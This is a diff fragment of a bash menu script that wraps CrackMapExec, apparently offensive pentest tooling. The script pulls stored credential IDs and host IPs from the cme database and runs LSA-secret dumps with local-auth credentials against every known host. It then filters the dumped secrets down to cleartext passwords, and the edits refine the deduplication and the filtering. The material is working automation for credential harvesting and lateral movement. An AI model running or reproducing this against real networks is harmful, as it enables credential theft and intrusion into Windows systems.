@@ -38,7 +38,7 @@ echo " "
 sqlite3 /root/.cme/workspaces/default/smb.db "SELECT id from users where domain='$domain';" | tee /tmp/cme-domain-accts-$tag.txt
 
 # select Local Auth accts
-sqlite3 /root/.cme/workspaces/default/smb.db "SELECT id from users where domain!='$domain';" | tee /tmp/cme-localauth-accts-$tag.txt
+sqlite3 /root/.cme/workspaces/default/smb.db "SELECT id from users where domain!='$domain' GROUP BY username,password;" | tee /tmp/cme-localauth-accts-$tag.txt
 
 # get list of all known IPs in cmedb
 sqlite3 /root/.cme/workspaces/default/smb.db "SELECT ip from computers;" | tee /tmp/cme-ip-$tag.txt
@@ -170,7 +170,7 @@ do
 			do
 				cme -t 30 smb /tmp/cme-ip-$tag.txt -id $i --local-auth --lsa | tee -a /tmp/cme-creds-check-$tag.txt
 			done
-            cat /root/.cme/logs/*.secrets | grep -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' > /tmp/lsa-clear-raw-$tag.txt
+            cat /root/.cme/logs/*.secrets | grep -a -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' | sed -E '/.{64}/d' > /tmp/lsa-clear-raw-$tag.txt
             sort /tmp/lsa-clear-raw-$tag.txt | uniq > /tmp/lsa-clear-$tag.txt
             echo " "
             echo ==========================================================
@@ -219,7 +219,7 @@ do
 			break
 			;;
         "Display LSA Clear-text of All Previously Gathered")
-            cat /root/.cme/logs/*.secrets | grep -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' > /tmp/lsa-clear-raw-$tag.txt
+            cat /root/.cme/logs/*.secrets | grep -a -v 'aad3b435b51404eeaad3b435b51404ee\|RasDialParams\|DPAPI_SYSTEM\|L$_SQSA\|L$kek\|aes256-cts-hmac\|L$ASP.NET\|aes128-cts-hmac\|des-cbc-md5\|dpapi_machinekey\|dpapi_userkey\|NL$KM:\|L$kek-KeyVault_' | sed -E '/.{64}/d' > /tmp/lsa-clear-raw-$tag.txt
             sort /tmp/lsa-clear-raw-$tag.txt | uniq > /tmp/lsa-clear-$tag.txt
             echo " "
             echo ==========================================================
